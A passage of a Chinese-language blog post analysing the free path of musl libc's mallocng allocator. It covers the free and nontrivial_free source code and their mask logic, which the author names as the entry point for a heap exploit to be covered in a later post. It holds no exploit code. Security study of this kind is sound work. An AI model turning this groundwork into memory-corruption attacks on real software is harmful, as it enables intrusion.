class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>anyway，拿到了<code>meta</code>地址之后，通过<code>get_stride</code>函数获取到其中保存的chunk的大小。</p>
<p>后面定义了一系列的变量，看到第一个if语句：<code>if (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx)</code>。前面一个判断条件是判断这个chunk的大小是否大于2页（<code>PGSZ</code>就是一页的大小），后面的则是判断这个chunk是否是由<code>malloc</code>通过<code>mmap</code>分配出来的。记得在分析<code>malloc</code>时提到当分配的chunk过大时会使用<code>mmap</code>直接分配且<code>last_idx</code>的值会被设置为0。这个if语句的主要目的是在释放一个较大的chunk时，将该chunk内含的一些页在内核层面上释放，这通过<code>madvice</code>系统调用来实现。</p>
<p>往后是一个循环。如果该chunk所在的<code>meta</code>的<code>free_mask</code>为0（表示当前的chunk是该<code>meta</code>中唯一一个释放的chunk）或该chunk释放后该<code>meta</code>中所有chunk都被释放，则跳出循环。否则修改<code>free_mask</code>位后返回。这里面的if-else语句不用管，因为涉及锁的问题，一般Linux系统都会加锁，因此else基本不会执行到。</p>
<p>如果释放的chunk既不是第一个，也不是最后一个，则会执行循环后面的代码。后面的调用<code>nontrivial_free</code>是关键操作，也是我们利用的突破点。</p>
<h2 id="nontrivial_freesrcmallocmallocngfreec-line-72"><a class="markdownIt-Anchor" href="#nontrivial_freesrcmallocmallocngfreec-line-72"></a> nontrivial_free（<code>/src/malloc/mallocng/free.c, line 72</code>）</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大多数的chunk释放请求都会执行到这个函数，第一个参数是<code>meta</code>，第二个是该<code>meta</code>内需要释放的chunk的索引。</p>
<p><code>mask</code>是<code>free_mask</code>和<code>avail_mask</code>相或的结果，二者都是比特位标识的控制位。第一个判断<code>if (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g))</code>中第一个条件指的是该<code>meta</code>中所有chunk是否都处于被使用或被释放的状态，第二个条件通过一个函数判断这个chunk是否可以释放，一般都为真。进入if语句体中判断该<code>meta</code>是否有下一个<code>meta</code>，如果有，将当前<code>meta</code>出链表，且如果该<code>meta</code>在出链表之前是链首且此时该链表中还有<code>meta</code>，则激活链首的<code>meta</code>。这里的激活（<code>activate_group</code>）是修改了<code>avail_mask</code>值，函数内强制要求该<code>meta</code>在修改前的<code>avail_mask</code>为0。然后调用<code>free_group</code>并返回。</p>
<p>如果进入了else语句体，说明<code>mask=0</code>，即<code>free_mask</code>和<code>avail_mask</code>均为0，该<code>meta</code>中所有chunk均正在被使用。如果该<code>meta</code>不是链首，则将该<code>meta</code>链入链表。最后更新<code>free_mask</code>并返回。</p>
<p>至此，有关于musl内存分配与释放的相关函数已经基本分析完毕，下一篇文章将重点介绍musl libc的利用方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">149</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">1.3m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">20:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
